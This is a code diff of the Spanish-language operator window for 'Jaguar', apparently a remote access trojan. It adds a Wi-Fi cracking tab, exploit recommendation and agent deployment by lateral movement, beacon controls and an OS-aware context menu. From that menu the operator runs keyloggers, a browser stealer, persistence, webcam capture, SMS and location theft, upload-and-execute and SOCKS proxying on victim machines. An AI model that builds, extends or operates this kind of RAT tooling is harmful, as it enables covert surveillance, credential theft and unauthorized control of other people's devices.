@@ -1,9 +1,17 @@
 # -*- coding: utf-8 -*-
-"""Ventana principal Jaguar — escritorio remoto + HVNC + stealer + escaner + exploits."""
+"""Ventana principal Jaguar — escritorio remoto + HVNC + stealer + escaner + exploits.
+
+Cadena de extremo a extremo: pestaña Wi-Fi (monitor → AP → PSK → conectar)
+→ puente de subred al Escáner → hosts/puertos → recomendación de exploits
+→ despliegue del agente → el cliente aparece solo en el árbol → menú
+contextual filtrado por SO y capacidades reales del agente.
+"""
 
 import base64
 import json
 import os
+import shutil
+import subprocess
 import threading
 import time
 
@@ -23,19 +31,66 @@ from jaguar.server.servidor import Servidor
 from jaguar.common.constants import APP_NAME, APP_VERSION
 from jaguar.common import config, escaner, exploits, geo, explotadores, lateral, wifi
 from jaguar.ui.movil_dialog import MovilDialog
-from jaguar.ui.wifi_dialog import WifiOfensivoDialog
 from jaguar.builder.constructor import Constructor
 
-COLS = ["", "ID", "Host", "Usuario", "SO", "IP", "País", "ISP", "Lat."]
+# ---------------------------------------------------------------------------
+# Import de la pestaña Wi-Fi. Si el modulo no esta, la app sigue arrancando
+# (solo se pierde la pestaña), en vez de reventar en el import.
+# ---------------------------------------------------------------------------
+try:
+    from jaguar.ui.wifi_tab import PanelWifi
+except Exception:
+    PanelWifi = None
+
+# El dialogo antiguo se mantiene como acceso rapido desde el boton del Escaner.
+try:
+    from jaguar.ui.wifi_dialog import WifiOfensivoDialog
+except Exception:
+    WifiOfensivoDialog = None
+
+# ---------------------------------------------------------------------------
+# Listas de clasificacion. Se importan de constants si estan (version 2.1) y
+# si no, se definen aqui: asi este fichero es compatible con las dos versiones.
+# ---------------------------------------------------------------------------
+try:
+    from jaguar.common.constants import (  # type: ignore
+        CMDS_RECON as _CR, CMDS_SILENCIOSOS as _CS, CMDS_SIN_DATOS as _CD,
+        PREFIJO_MOVIL as _PM,
+    )
+except Exception:
+    _CR = ("powershell", "whoami", "netstat", "arp", "ipconfig", "tasklist",
+           "net_user", "net_view", "schtasks_list", "drives", "env", "wmi",
+           "spawn", "portscan", "recon_full")
+    _CS = ("ping", "raton", "teclado", "hvnc_raton", "hvnc_teclado",
+           "hvnc_captura", "hvnc_stream", "captura_stream", "webcam_frame",
+           "captura", "hvnc_estado", "stealer_estado", "movil_pantalla")
+    _CD = ("hvnc_iniciar", "hvnc_cerrar", "hvnc_navegar", "hvnc_stream",
+           "captura_stream", "webcam_iniciar", "webcam_parar", "hvnc_opciones",
+           "bloquear_entrada", "persistir", "proxy_iniciar", "proxy_parar",
+           "swap_raton", "clip_set", "abrir_url", "mensaje", "subir_ejecutar",
+           "keylogger_iniciar")
+    _PM = "movil_"
+
+CMDS_RECON = tuple(_CR)
+CMDS_SILENCIOSOS = tuple(_CS)
+CMDS_SIN_DATOS = tuple(_CD)
+PREFIJO_MOVIL = _PM
+
+# Columnas del arbol de clientes. "Arq." (RF10) es informativa: sale del
+# sysinfo del agente (info["arquitectura"]).
+COLS = ["", "ID", "Host", "Usuario", "SO", "Arq.", "IP", "País", "ISP", "Lat."]
+COL_LAT = 9
+
 VK_ESPECIALES = {
     Qt.Key.Key_Return: 0x0D, Qt.Key.Key_Enter: 0x0D, Qt.Key.Key_Backspace: 0x08,
     Qt.Key.Key_Tab: 0x09, Qt.Key.Key_Escape: 0x1B, Qt.Key.Key_Delete: 0x2E,
     Qt.Key.Key_Left: 0x25, Qt.Key.Key_Up: 0x26, Qt.Key.Key_Right: 0x27,
     Qt.Key.Key_Down: 0x28, Qt.Key.Key_Home: 0x24, Qt.Key.Key_End: 0x23,
 }
-CMDS_RECON = ("powershell", "whoami", "netstat", "arp", "ipconfig", "tasklist",
-              "net_user", "net_view", "schtasks_list", "drives", "env", "wmi",
-              "spawn", "portscan", "recon_full")
+
+# Orden de presentacion por SO para el boton "ordenar" (RF10).
+ORDEN_SO = {"windows": 0, "linux": 1, "macos": 2, "android": 3}
+
 
 def wifi_ofensivo_hay_stack():
     try:
@@ -794,6 +849,7 @@ class MainWindow(QMainWindow):
     _sig_builder = pyqtSignal(str)
     _sig_nativo = pyqtSignal(str)
     _sig_stealer = pyqtSignal(str)
+    _sig_nse = pyqtSignal(str)
 
     def __init__(self):
         super().__init__()
@@ -820,6 +876,7 @@ class MainWindow(QMainWindow):
         self.movil_por_cid = {}
         self._pings = {}
         self._screenshot_pend = {}
+        self._filtro_so = ""
 
         self._sig_log.connect(self._log)
         self._sig_escaneo_fin.connect(self._on_escaneo_fin)
@@ -828,6 +885,7 @@ class MainWindow(QMainWindow):
         self._sig_builder.connect(self._on_builder_log)
         self._sig_nativo.connect(self._append_nativo)
         self._sig_stealer.connect(self._append_stealer)
+        self._sig_nse.connect(self._append_nativo)
 
         self._build_ui()
         self._ping_timer = QTimer(self)
@@ -887,9 +945,24 @@ class MainWindow(QMainWindow):
         cab.addStretch()
         self.in_buscar = QLineEdit()
         self.in_buscar.setPlaceholderText("filtrar...")
-        self.in_buscar.setFixedWidth(140)
-        self.in_buscar.textChanged.connect(self._filtrar)
+        self.in_buscar.setFixedWidth(120)
+        self.in_buscar.textChanged.connect(lambda _: self._aplicar_filtros())
         cab.addWidget(self.in_buscar)
+        # Filtro y orden por SO (RF10).
+        self.cmb_filtro_so = QComboBox()
+        self.cmb_filtro_so.addItem("SO: todos", "")
+        for k, etq in (("windows", "Windows"), ("linux", "Linux"),
+                       ("macos", "macOS"), ("android", "Android")):
+            self.cmb_filtro_so.addItem(etq, k)
+        self.cmb_filtro_so.setFixedWidth(104)
+        self.cmb_filtro_so.currentIndexChanged.connect(self._on_filtro_so)
+        cab.addWidget(self.cmb_filtro_so)
+        self.btn_orden_so = QPushButton("⇅")
+        self.btn_orden_so.setFixedWidth(30)
+        self.btn_orden_so.setToolTip("Ordenar el árbol por sistema operativo")
+        self.btn_orden_so.setStyleSheet(ESTILO_BOTON)
+        self.btn_orden_so.clicked.connect(self._ordenar_por_so)
+        cab.addWidget(self.btn_orden_so)
         il.addLayout(cab)
 
         self.tree = QTreeWidget()
@@ -899,7 +972,8 @@ class MainWindow(QMainWindow):
         self.tree.setColumnWidth(2, 120)
         self.tree.setColumnWidth(3, 90)
         self.tree.setColumnWidth(4, 110)
-        self.tree.setColumnWidth(5, 110)
+        self.tree.setColumnWidth(5, 70)
+        self.tree.setColumnWidth(6, 110)
         self.tree.setRootIsDecorated(False)
         self.tree.setAlternatingRowColors(True)
         self.tree.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
@@ -932,19 +1006,43 @@ class MainWindow(QMainWindow):
 
         self.tabs = QTabWidget()
         self.tabs.setDocumentMode(True)
-        self.tabs.addTab(self._tab_escaner(), "  Escáner  ")
-        self.tabs.addTab(self._tab_exploits(), "  Exploits  ")
-        self.tabs.addTab(self._tab_stealer(), "  Stealer  ")
-        self.tabs.addTab(self._tab_beacons(), "  Beacons  ")
-        self.tabs.addTab(self._tab_builder(), "  Builder  ")
-        self.tabs.addTab(self._tab_log(), "  Registro  ")
-        self.tabs.addTab(self._tab_lateral(), "  Lateral  ")
+        self.w_escaner = self._tab_escaner()
+        self.tabs.addTab(self.w_escaner, "  Escáner  ")
+        # --- Pestaña Wi-Fi (RF1): persistente, entre Escáner y Exploits ---
+        self.panel_wifi = None
+        if PanelWifi is not None:
+            try:
+                self.panel_wifi = PanelWifi(self)
+                self.panel_wifi.subred_lista.connect(self._on_subred_wifi)
+                self.tabs.addTab(self.panel_wifi, "  📡 Wi-Fi  ")
+            except Exception as e:
+                self.panel_wifi = None
+                self._log(f"[wifi] no se pudo crear la pestaña: {e}")
+        self.w_exploits = self._tab_exploits()
+        self.tabs.addTab(self.w_exploits, "  Exploits  ")
+        self.w_stealer = self._tab_stealer()
+        self.tabs.addTab(self.w_stealer, "  Stealer  ")
+        self.w_beacons = self._tab_beacons()
+        self.tabs.addTab(self.w_beacons, "  Beacons  ")
+        self.w_builder = self._tab_builder()
+        self.tabs.addTab(self.w_builder, "  Builder  ")
+        self.w_log = self._tab_log()
+        self.tabs.addTab(self.w_log, "  Registro  ")
+        self.w_lateral = self._tab_lateral()
+        self.tabs.addTab(self.w_lateral, "  Lateral  ")
         split.addWidget(self.tabs)
 
         split.setStretchFactor(0, 0)
         split.setStretchFactor(1, 1)
         split.setSizes([430, 930])
         root.addWidget(split, 1)
+
+    def _ir_tab(self, widget):
+        """Va a la pestaña de `widget` sin depender de indices fijos (al meter
+        la pestaña Wi-Fi los indices de Stealer y Exploits se desplazan)."""
+        idx = self.tabs.indexOf(widget)
+        if idx >= 0:
+            self.tabs.setCurrentIndex(idx)
 
     def _tab_escaner(self):
         w = QWidget()
@@ -973,15 +1071,30 @@ class MainWindow(QMainWindow):
         self.chk_nmap.clicked.connect(
             lambda: self.chk_nmap.setText(f"nmap: {'SÍ' if self.chk_nmap.isChecked() else 'NO'}"))
         fila.addWidget(self.chk_nmap)
-        self.btn_rec = QPushButton("➜  Recomendar exploits")
+        self.btn_rec = QPushButton("🎯  Recomendar exploits")
         self.btn_rec.setStyleSheet(ESTILO_BOTON)
         self.btn_rec.clicked.connect(self._recomendar_desde_escaneo)
         fila.addWidget(self.btn_rec)
+        self.btn_verificar = QPushButton("🔍  Verificar (nmap NSE)")
+        self.btn_verificar.setStyleSheet(ESTILO_BOTON)
+        self.btn_verificar.setToolTip(
+            "Lanza el script NSE del exploit seleccionado para confirmarlo.")
+        self.btn_verificar.clicked.connect(self._verificar_nse)
+        fila.addWidget(self.btn_verificar)
         self.btn_nativo = QPushButton("⚡  Explotar (nativo)")
         self.btn_nativo.setStyleSheet(ESTILO_BOTON)
+        self.btn_nativo.setToolTip(
+            "Explotador en Python puro. Deshabilitado si el puerto no tiene uno.")
         self.btn_nativo.clicked.connect(self._explotar_nativo)
         fila.addWidget(self.btn_nativo)
-        self.btn_wifi = QPushButton("📡  Wi-Fi (monitor)")
+        self.btn_desplegar = QPushButton("🚀  Desplegar agente")
+        self.btn_desplegar.setStyleSheet(ESTILO_BOTON)
+        self.btn_desplegar.setToolTip(
+            "Movimiento lateral desde el cliente pivote; si no hay pivote, "
+            "copia el comando al portapapeles.")
+        self.btn_desplegar.clicked.connect(self._desplegar_agente)
+        fila.addWidget(self.btn_desplegar)
+        self.btn_wifi = QPushButton("📡  Wi-Fi")
         self.btn_wifi.setStyleSheet(ESTILO_BOTON)
         self.btn_wifi.clicked.connect(self._escanear_wifi)
         fila.addWidget(self.btn_wifi)
@@ -996,7 +1109,18 @@ class MainWindow(QMainWindow):
         self.res_escaner.setColumnWidth(0, 140)
         self.res_escaner.setAlternatingRowColors(True)
         self.res_escaner.setRootIsDecorated(False)
+        self.res_escaner.itemDoubleClicked.connect(self._detalle_host)
+        self.res_escaner.itemSelectionChanged.connect(self._refrescar_botones_escaner)
         l.addWidget(self.res_escaner, 1)
+        self.lbl_hostdet = QLabel("doble clic en un host para ver su detalle")
+        self.lbl_hostdet.setStyleSheet(f"color:{TENUE};")
+        l.addWidget(self.lbl_hostdet)
+        self.out_hostdet = QPlainTextEdit()
+        self.out_hostdet.setReadOnly(True)
+        self.out_hostdet.setFixedHeight(120)
+        self.out_hostdet.setStyleSheet(
+            "background:#0b0b0d;color:#ff5c5c;font-family:Consolas;")
+        l.addWidget(self.out_hostdet)
         self.out_nativo = QPlainTextEdit()
         self.out_nativo.setReadOnly(True)
         self.out_nativo.setFixedHeight(120)
@@ -1014,6 +1138,7 @@ class MainWindow(QMainWindow):
         self.tree_exploits.setColumnWidth(2, 190)
         self.tree_exploits.setAlternatingRowColors(True)
         self.tree_exploits.setRootIsDecorated(False)
+        self.tree_exploits.itemSelectionChanged.connect(self._refrescar_botones_exploits)
         l.addWidget(self.tree_exploits, 1)
         fila = QHBoxLayout()
         b1 = QPushButton("➜  Lanzar en cliente")
@@ -1022,16 +1147,17 @@ class MainWindow(QMainWindow):
         b2 = QPushButton("📋  Copiar comando")
         b2.setStyleSheet(ESTILO_BOTON)
         b2.clicked.connect(self._copiar_exploit)
-        b3 = QPushButton("🧭  Detección nmap")
+        b3 = QPushButton("🔍  Verificar (nmap NSE)")
         b3.setStyleSheet(ESTILO_BOTON)
-        b3.clicked.connect(self._copiar_deteccion)
+        b3.clicked.connect(self._verificar_nse)
         b4 = QPushButton("⚡  Ejecutar nativo")
         b4.setStyleSheet(ESTILO_BOTON)
         b4.clicked.connect(self._ejecutar_exploit_nativo)
-        fila.addWidget(b1)
-        fila.addWidget(b2)
-        fila.addWidget(b3)
-        fila.addWidget(b4)
+        b5 = QPushButton("🚀  Desplegar agente")
+        b5.setStyleSheet(ESTILO_BOTON)
+        b5.clicked.connect(self._desplegar_agente)
+        for b in (b1, b2, b3, b4, b5):
+            fila.addWidget(b)
         fila.addStretch()
         l.addLayout(fila)
         self.out_exploits = QPlainTextEdit()
@@ -1132,6 +1258,27 @@ class MainWindow(QMainWindow):
         self.out_beacon.setStyleSheet("background:#0b0b0d;color:#ff5c5c;font-family:Consolas;")
         l.addWidget(self.out_beacon, 2)
 
+        # --- clientes activos + beacon (RF13) ---------------------------
+        l.addWidget(QLabel("<b style='color:#ff2b2b;'>CLIENTES ACTIVOS</b> — "
+                           "selecciona uno para operar; el estado de beacon se "
+                           "refresca solo."))
+        fila_c = QHBoxLayout()
+        self.lista_clientes = QListWidget()
+        self.lista_clientes.setMaximumHeight(110)
+        self.lista_clientes.itemDoubleClicked.connect(self._seleccionar_desde_lista)
+        self.lista_clientes.itemSelectionChanged.connect(self._seleccionar_desde_lista)
+        fila_c.addWidget(self.lista_clientes, 1)
+        col_b = QVBoxLayout()
+        for txt, fn in (("🎯 Seleccionar en árbol", self._seleccionar_desde_lista),
+                        ("⟳ Refrescar", self._beacon_refrescar)):
+            b = QPushButton(txt)
+            b.setStyleSheet(ESTILO_BOTON)
+            b.clicked.connect(fn)
+            col_b.addWidget(b)
+        col_b.addStretch()
+        fila_c.addLayout(col_b)
+        l.addLayout(fila_c)
+
         l.addWidget(QLabel("Beacon: el agente reporta cada X segundos con jitter."))
         form = QGridLayout()
         form.setHorizontalSpacing(8)
@@ -1145,9 +1292,10 @@ class MainWindow(QMainWindow):
         form.addWidget(self.in_jitter, 1, 1, Qt.AlignmentFlag.AlignLeft)
         l.addLayout(form)
         fila = QHBoxLayout()
-        for txt, fn in [("Aplicar a seleccionado", self._beacon_sel),
+        for txt, fn in (("Aplicar a seleccionado", self._beacon_sel),
                         ("Aplicar a TODOS", self._beacon_todos),
-                        ("Refrescar", self._beacon_refrescar)]:
+                        ("⏹ Quitar beacon (normal)", self._beacon_quitar),
+                        ("📡 Beacon sigiloso a todos", self._beacon_sigiloso)):
             b = QPushButton(txt)
             b.setStyleSheet(ESTILO_BOTON)
             b.clicked.connect(fn)
@@ -1155,7 +1303,7 @@ class MainWindow(QMainWindow):
         fila.addStretch()
         l.addLayout(fila)
         self.tree_beacons = QTreeWidget()
-        self.tree_beacons.setHeaderLabels(["ID", "Host", "IP", "Sleep", "Jitter", "Estado"])
+        self.tree_beacons.setHeaderLabels(["ID", "Host", "IP", "SO", "Sleep", "Jitter", "Estado"])
         self.tree_beacons.setColumnWidth(0, 80)
         self.tree_beacons.setAlternatingRowColors(True)
         self.tree_beacons.setRootIsDecorated(False)
@@ -1365,7 +1513,8 @@ class MainWindow(QMainWindow):
 
     def _on_cliente_conectado(self, cid, info):
         it = QTreeWidgetItem(["", cid[:8], info.get("host", "?"), info.get("usuario", "?"),
-                              info.get("so", "?"), info.get("ip", "?"), "…", "", ""])
+                              info.get("so", "?"), info.get("arquitectura", "?"),
+                              info.get("ip", "?"), "…", "", ""])
         it.setData(0, Qt.ItemDataRole.UserRole, cid)
         f = it.font(0)
         f.setPointSize(11)
@@ -1374,6 +1523,7 @@ class MainWindow(QMainWindow):
         self.clientes[cid] = {"item": it, "info": info, "beacon": None}
         self._carpeta_capturas(cid)     # crea la carpeta de capturas del cliente
         self._refrescar_conteo()
+        self._beacon_refrescar()
         self._log(f"[+] {info.get('host')} ({cid[:8]}) conectado desde {info.get('ip_externa','?')}")
         ip = info.get("ip_externa") or info.get("ip")
         threading.Thread(target=self._geo_worker, args=(cid, ip), daemon=True).start()
@@ -1388,8 +1538,8 @@ class MainWindow(QMainWindow):
             return
         it = self.clientes[cid]["item"]
         it.setText(0, geo.bandera(datos.get("cc", "")))
-        it.setText(6, datos.get("pais", ""))
-        it.setText(7, datos.get("isp", ""))
+        it.setText(7, datos.get("pais", ""))
+        it.setText(8, datos.get("isp", ""))
         self.clientes[cid]["info"].update(datos)
 
     def _on_cliente_desconectado(self, cid):
@@ -1398,6 +1548,7 @@ class MainWindow(QMainWindow):
             self.tree.takeTopLevelItem(idx)
             del self.clientes[cid]
             self._refrescar_conteo()
+            self._beacon_refrescar()
             self._log(f"[-] {cid[:8]} desconectado")
 
     def _on_mensaje_recibido(self, cid, msg):
@@ -1413,11 +1564,18 @@ class MainWindow(QMainWindow):
         if tipo != "respuesta":
             return
         cmd, ok, datos = msg.get("cmd"), msg.get("ok"), msg.get("datos")
+
+        # --- MODULO MOVIL: se enruta ANTES del log generico (RF12) -------
+        if cmd and str(cmd).startswith(PREFIJO_MOVIL):
+            self._movil_msg(cid, cmd, datos if ok else {"error": msg.get("error", "")})
+            return
+
         if cmd in ("ping", "raton", "teclado", "hvnc_raton", "hvnc_teclado") and ok:
             if cmd == "ping":
                 ts = self._pings.get(cid)
                 if ts and cid in self.clientes:
-                    self.clientes[cid]["item"].setText(8, f"{int((time.time() - ts) * 1000)} ms")
+                    self.clientes[cid]["item"].setText(
+                        COL_LAT, f"{int((time.time() - ts) * 1000)} ms")
             return
         if cmd == "hvnc_captura" and ok:
             self._enrutar_hvnc(cid, datos or {})
@@ -1446,17 +1604,12 @@ class MainWindow(QMainWindow):
         if cmd and cmd.startswith("stealer_") and ok:
             self._stealer_msg(cid, cmd, datos or {})
             return
-        if cmd and cmd.startswith("movil_"):
-            self._movil_msg(cid, cmd, datos if ok else {"error": msg.get("error", "")})
+        if cmd in CMDS_SILENCIOSOS and ok:
             return
         self._log(f"[{cid[:8]}] '{cmd}' -> {'OK' if ok else 'ERROR'}")
         if ok and cmd == "captura":
             self._enrutar_frame(cid, datos or {})
-        if cmd in ("hvnc_iniciar", "hvnc_cerrar", "hvnc_navegar", "hvnc_stream",
-                   "captura_stream", "webcam_iniciar", "webcam_parar",
-                   "hvnc_opciones", "bloquear_entrada", "persistir", "proxy_iniciar",
-                   "proxy_parar", "swap_raton", "clip_set", "abrir_url", "mensaje",
-                   "subir_ejecutar", "keylogger_iniciar"):
+        if cmd in CMDS_SIN_DATOS:
             return
         for dlg in self.dialogs_por_cid.get(cid, []):
             if not ok:
@@ -1485,12 +1638,42 @@ class MainWindow(QMainWindow):
     def _refrescar_conteo(self):
         self.lbl_n.setText(str(len(self.clientes)))
 
-    def _filtrar(self, texto):
-        texto = texto.lower()
+    # ================================================================= filtros
+    def _on_filtro_so(self):
+        self._filtro_so = self.cmb_filtro_so.currentData() or ""
+        self._aplicar_filtros()
+
+    def _aplicar_filtros(self):
+        """Aplica filtro de texto + filtro por SO (RF10)."""
+        texto = self.in_buscar.text().lower().strip()
         for i in range(self.tree.topLevelItemCount()):
             it = self.tree.topLevelItem(i)
-            visible = any(texto in it.text(c).lower() for c in range(1, len(COLS)))
-            it.setHidden(not visible)
+            cid = it.data(0, Qt.ItemDataRole.UserRole)
+            info = self.clientes.get(cid, {}).get("info", {})
+            plataforma = (info.get("plataforma") or "").lower()
+            ok_texto = (not texto) or any(
+                texto in it.text(c).lower() for c in range(1, len(COLS)))
+            ok_so = (not self._filtro_so) or plataforma == self._filtro_so
+            it.setHidden(not (ok_texto and ok_so))
+
+    def _filtrar(self, _texto=None):
+        self._aplicar_filtros()
+
+    def _ordenar_por_so(self):
+        """Reordena el árbol agrupando por SO (Windows → Linux → macOS → Android)."""
+        items = [self.tree.takeTopLevelItem(0)
+                 for _ in range(self.tree.topLevelItemCount())]
+
+        def clave(it):
+            cid = it.data(0, Qt.ItemDataRole.UserRole)
+            plat = (self.clientes.get(cid, {}).get("info", {})
+                    .get("plataforma") or "zzz").lower()
+            return (ORDEN_SO.get(plat, 9), it.text(2).lower())
+
+        for it in sorted(items, key=clave):
+            self.tree.addTopLevelItem(it)
+        self._aplicar_filtros()
+        self._log("[clientes] ordenados por SO")
 
     def _mostrar_detalles(self):
         it = self.tree.currentItem()
@@ -1599,53 +1782,153 @@ class MainWindow(QMainWindow):
 
     # ================================================================= contexto
     def _menu_contexto(self, pos):
+        """Menú contextual construido SEGÚN el SO y las capacidades reales del
+        agente (RF11). Lo que el agente no soporta no se muestra, en lugar de
+        fallar al pulsarlo."""
         it = self.tree.itemAt(pos)
         if not it:
             return
         cid = it.data(0, Qt.ItemDataRole.UserRole)
+        info = self.clientes.get(cid, {}).get("info", {})
+        plataforma = (info.get("plataforma") or "").lower()
+        caps = info.get("caps") or {}
+
+        def puede(cap):
+            if not caps:
+                return True     # agente antiguo sin caps: mostramos todo
+            return bool(caps.get(cap))
+
         m = QMenu(self)
-        acciones = [
-            ("🖥  Terminal", lambda: self._abrir_terminal(cid)),
-            ("🖥  Escritorio remoto (control)", lambda: self._abrir_escritorio(cid)),
-            ("🎞  Galería de capturas", lambda: self._abrir_galeria(cid)),
-            ("🌐  HVNC (navegador)", lambda: self._abrir_hvnc(cid)),
-            ("🗂  Explorador de la víctima", lambda: self._abrir_explorador(cid)),
-            *([("📱  Móvil (Android / Termux)", lambda: self._abrir_movil(cid))]
-              if (self.clientes.get(cid, {}).get("info", {}).get("plataforma") == "android"
-                  or self.clientes.get(cid, {}).get("info", {}).get("caps", {}).get("movil"))
-              else []),
-            ("🕵  Stealer: recolectar", lambda: self._stealer_recolectar_cid(cid)),
-            ("🕵  Stealer: traer paquete", lambda: self._stealer_traer_cid(cid)),
-            ("📊  Info del sistema", lambda: self._enviar_comando(cid, "sysinfo")),
-            ("⚡  Procesos", lambda: self._enviar_comando(cid, "procesos")),
-            ("📸  Screenshot (guardar PNG)", lambda: self._screenshot(cid)),
-            ("🖱  Cambiar botones del ratón (swap)", lambda: self._enviar_comando(cid, "swap_raton")),
-            ("📷  Webcam en vivo", lambda: self._abrir_webcam(cid)),
-            ("⌨️  Keylogger iniciar", lambda: self._enviar_comando(cid, "keylogger_iniciar")),
-            ("📜  Keylogger leer", lambda: self._enviar_comando(cid, "keylogger_leer")),
-            ("🔓  Persistencia", lambda: self._enviar_comando(cid, "persistir")),
-            ("📋  Portapapeles: traer", lambda: self._enviar_comando(cid, "clip_get")),
-            ("📥  Portapapeles: enviar", lambda: self._pedir_y(cid, "clip_set", "Texto", "")),
-            ("🔒  Bloquear/Desbloquear entrada", lambda: self._enviar_comando(cid, "bloquear_entrada")),
-            ("🌍  Iniciar proxy SOCKS5 (:1080)", lambda: self._enviar_comando(cid, "proxy_iniciar", {"puerto": 1080})),
-            ("🌍  Parar proxy SOCKS5", lambda: self._enviar_comando(cid, "proxy_parar")),
-            ("🌐  Abrir URL", lambda: self._pedir_y(cid, "abrir_url", "URL", "https://")),
-            ("💬  Mensaje", lambda: self._pedir_y(cid, "mensaje", "Texto", "Hola")),
-            ("⬇️  Descargar archivo", lambda: self._descargar(cid)),
-            ("⬆️  Subir y ejecutar (del RAT)", lambda: self._subir_ejecutar(cid)),
-            ("❌  Desconectar", lambda: self._enviar_comando(cid, "desconectar")),
-        ]
-        for txt, fn in acciones:
+
+        def add(txt, fn, cap=None):
+            if cap and not puede(cap):
+                return
             a = QAction(txt, self)
             a.triggered.connect(fn)
             m.addAction(a)
+
+        def sep(titulo):
+            if m.actions():
+                m.addSeparator()
+            m.addSection(titulo)
+
+        # ---------------------------- GENÉRICO ---------------------------
+        sep("Genérico")
+        add("📊  Info del sistema", lambda: self._enviar_comando(cid, "sysinfo"))
+        add("⚡  Procesos", lambda: self._enviar_comando(cid, "procesos"))
+        add("🖥  Terminal", lambda: self._abrir_terminal(cid), "shell")
+        add("📋  Portapapeles: traer", lambda: self._enviar_comando(cid, "clip_get"),
+            "portapapeles")
+        add("📥  Portapapeles: enviar",
+            lambda: self._pedir_y(cid, "clip_set", "Texto", ""), "portapapeles")
+        add("📸  Screenshot (guardar PNG)", lambda: self._screenshot(cid), "captura")
+        add("⬇️  Descargar archivo", lambda: self._abrir_explorador(cid), "archivos")
+        add("⬆️  Subir y ejecutar (del RAT)", lambda: self._subir_ejecutar(cid), "archivos")
+        add("🌍  Iniciar proxy SOCKS5 (:1080)",
+            lambda: self._enviar_comando(cid, "proxy_iniciar", {"puerto": 1080}), "proxy")
+        add("🌍  Parar proxy SOCKS5", lambda: self._enviar_comando(cid, "proxy_parar"),
+            "proxy")
+        add("🌐  Abrir URL", lambda: self._pedir_y(cid, "abrir_url", "URL", "https://"),
+            "abrir_url")
+        add("💬  Mensaje", lambda: self._pedir_y(cid, "mensaje", "Texto", "Hola"), "mensaje")
+
+        # ---------------------------- WINDOWS ----------------------------
+        if plataforma == "windows":
+            sep("Windows")
+            add("🖥  Escritorio remoto (control)", lambda: self._abrir_escritorio(cid),
+                "stream")
+            add("🎞  Galería de capturas", lambda: self._abrir_galeria(cid))
+            add("🌐  HVNC (navegador)", lambda: self._abrir_hvnc(cid), "hvnc")
+            add("🗂  Explorador de la víctima", lambda: self._abrir_explorador(cid),
+                "archivos")
+            add("📷  Webcam en vivo", lambda: self._abrir_webcam(cid), "webcam")
+            add("⌨️  Keylogger iniciar",
+                lambda: self._enviar_comando(cid, "keylogger_iniciar"), "keylogger")
+            add("📜  Keylogger leer",
+                lambda: self._enviar_comando(cid, "keylogger_leer"), "keylogger")
+            add("🖱  Cambiar botones del ratón (swap)",
+                lambda: self._enviar_comando(cid, "swap_raton"), "raton")
+            add("🕵  Stealer: recolectar", lambda: self._stealer_recolectar_cid(cid),
+                "stealer_navegadores")
+            add("🕵  Stealer: traer paquete", lambda: self._stealer_traer_cid(cid))
+            add("🔓  Persistencia", lambda: self._enviar_comando(cid, "persistir"),
+                "persistencia")
+            add("📶  Perfiles Wi-Fi", lambda: self._enviar_comando(cid, "wifi_perfiles"),
+                "wifi")
+            add("🛡  Servicios en ejecución", lambda: self._enviar_comando(cid, "wmi"))
+            add("🔐  Privilegios / UAC",
+                lambda: self._enviar_comando(cid, "privilegios"), "privilegios")
+            add("🔒  Bloquear/Desbloquear entrada",
+                lambda: self._enviar_comando(cid, "bloquear_entrada"), "bloquear")
+            add("⏻  Apagar", lambda: self._energia(cid, "apagar"), "energia")
+            add("🔄  Reiniciar", lambda: self._energia(cid, "reiniciar"), "energia")
+            add("🚪  Cerrar sesión", lambda: self._energia(cid, "logoff"), "energia")
+
+        # -------------------------- LINUX / MACOS ------------------------
+        elif plataforma in ("linux", "macos"):
+            sep("Linux / macOS")
+            add("📸  Captura de pantalla (stream)",
+                lambda: self._abrir_escritorio(cid), "stream")
+            add("🎞  Galería de capturas", lambda: self._abrir_galeria(cid))
+            add("🗂  Explorador de la víctima", lambda: self._abrir_explorador(cid),
+                "archivos")
+            add("⌨️  Keylogger iniciar",
+                lambda: self._enviar_comando(cid, "keylogger_iniciar"), "keylogger")
+            add("📜  Keylogger leer",
+                lambda: self._enviar_comando(cid, "keylogger_leer"), "keylogger")
+            add("🔓  Persistencia (systemd/cron)",
+                lambda: self._enviar_comando(cid, "persistir"), "persistencia")
+            add("📶  Perfiles Wi-Fi", lambda: self._enviar_comando(cid, "wifi_perfiles"),
+                "wifi")
+            add("🔐  Privilegios / sudo",
+                lambda: self._enviar_comando(cid, "privilegios"), "privilegios")
+            add("📦  Paquetes instalados",
+                lambda: self._enviar_comando(cid, "shell",
+                                             {"comando": "dpkg -l 2>/dev/null | head -100"}))
+            add("⏻  Apagar", lambda: self._energia(cid, "apagar"), "energia")
+            add("🔄  Reiniciar", lambda: self._energia(cid, "reiniciar"), "energia")
+
+        # ---------------------------- ANDROID ---------------------------
+        elif plataforma == "android":
+            sep("Android")
+            add("📱  Móvil (Android / Termux)", lambda: self._abrir_movil(cid), "movil")
+            add("📸  Captura de pantalla", lambda: self._screenshot(cid), "captura")
+            add("🖥  Shell Termux", lambda: self._abrir_terminal(cid), "shell")
+            add("🔔  Notificaciones",
+                lambda: self._enviar_comando(cid, "movil_notif_list"), "movil")
+            add("📍  Ubicación", lambda: self._enviar_comando(cid, "movil_ubicacion"),
+                "movil")
+            add("📡  Sensores", lambda: self._enviar_comando(cid, "movil_sensores",
+                                                            {"listar": True}), "movil")
+            add("💬  SMS", lambda: self._enviar_comando(cid, "movil_sms", {"limite": 50}),
+                "movil")
+            add("📦  Apps instaladas",
+                lambda: self._enviar_comando(cid, "movil_apps", {"tipo": "usuario"}), "movil")
+            add("📶  WiFi actual", lambda: self._enviar_comando(cid, "movil_wifi"), "movil")
+            add("🔓  Persistencia Termux:Boot",
+                lambda: self._enviar_comando(cid, "movil_persistir"), "persistencia")
+            add("🔓  Comprobar root", lambda: self._enviar_comando(cid, "movil_root"),
+                "movil")
+            add("🔋  Batería", lambda: self._enviar_comando(cid, "movil_bateria"), "movil")
+            add("🔄  Reiniciar", lambda: self._energia(cid, "reiniciar"), "energia")
+
+        # ---------------------------- cierre ----------------------------
+        if m.actions():
+            m.addSeparator()
+        a = QAction("❌  Desconectar", self)
+        a.triggered.connect(lambda: self._enviar_comando(cid, "desconectar"))
+        m.addAction(a)
+
         m.exec(self.tree.viewport().mapToGlobal(pos))
+
+    def _energia(self, cid, modo):
+        self._enviar_comando(cid, "energia", {"modo": modo})
 
     def _stealer_recolectar_cid(self, cid):
         args = {k: c.isChecked() for k, c in self.st_chk.items()}
         args["url"] = self.in_st_url.text().strip()
         self._enviar_comando(cid, "stealer_recolectar", args)
-        self.tabs.setCurrentIndex(2)
+        self._ir_tab(self.w_stealer)
 
